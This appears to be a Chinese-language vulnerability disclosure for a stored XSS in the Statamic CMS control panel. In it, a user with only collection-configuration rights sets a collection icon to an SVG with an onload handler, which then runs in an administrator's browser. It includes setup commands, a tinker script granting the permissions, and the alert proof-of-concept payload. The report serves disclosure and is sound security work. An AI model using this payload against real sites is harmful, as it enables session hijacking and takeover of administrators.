# 漏洞描述

地址：https://github.com/statamic/cms.git
版本：new
漏洞：存储型xss

# 文件地址

- 攻击权限入口：configure collections 直接放行，见 CollectionPolicy.php#L16 (/Users/zsm/Downloads/cms/src/Policies/CollectionPolicy.php#L16)
- 危险值写入：->icon($values['icon'])，见 CollectionsController.php#L328 (/Users/zsm/Downloads/cms/src/Http/Controllers/CP/Collections/CollectionsController.php#L328)
- 导航使用该 icon：见 CoreNav.php#L91 (/Users/zsm/Downloads/cms/src/CP/Navigation/CoreNav.php#L91)
- 前端把 <svg...> 直接作为模板渲染：见 Icon.vue#L16 (/Users/zsm/Downloads/cms/resources/js/components/ui/Icon/Icon.vue#L16)

# 漏洞复现

1. 准备测试站点（如果你已有站点可跳过）

composer create-project statamic/statamic statamic-lab
cd statamic-lab

composer config repositories.local-cms '{"type":"path","url":"/Users/zsm/Downloads/cms","options":
{"symlink":true}}'
composer require statamic/cms:@dev

cp .env.example .env
php artisan key:generate
php artisan statamic:install

2. 开启 Pro（为了创建第二个测试账号）
   statamic:make:user 在非 Pro 且已有用户时会阻止继续创建（见 MakeUser.php#L73 (/Users/zsm/Downloads/cms/src/
   Console/Commands/MakeUser.php#L73)）。

php artisan statamic:pro:enable --update-config

3. 创建测试账号

php artisan statamic:make:user admin@example.test --password='Admin#123456' --super
php artisan statamic:make:user attacker@example.test --password='Attacker#123456'

建议账号如下：

| 角色           | 邮箱                  | 密码            | 权限                                 |
| -------------- | --------------------- | --------------- | ------------------------------------ |
| 受害者(管理员) | admin@example.test    | Admin#123456    | super                                |
| 攻击者(低权限) | attacker@example.test | Attacker#123456 | 仅 access cp + configure collections |

4. 给攻击者最小权限（仅两项）

php artisan tinker <<'PHP'
use Statamic\Facades\Role;
use Statamic\Facades\User;

$role = Role::find('xss_tester') ?: Role::make()->handle('xss_tester');
$role->title('XSS Tester')->permissions(['access cp','configure collections'])->save();

$u = User::findByEmail('attacker@example.test');
$u->assignRole('xss_tester')->save();
PHP

5. 启动站点

php artisan serve --host=127.0.0.1 --port=8000

## 漏洞小结

1. 浏览器 A 登录攻击者：http://127.0.0.1:8000/cp
2. 进入任意 Collection 编辑页（如 pages）。
3. 用 Burp/代理拦截保存请求，把 icon 字段改成：

> <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS:'+document.domain)"></svg>

4. 发送成功后，浏览器 B 登录管理员并打开 /cp 或刷新侧边导航。
5. 弹窗即复现成功（跨账号、非自攻击）。
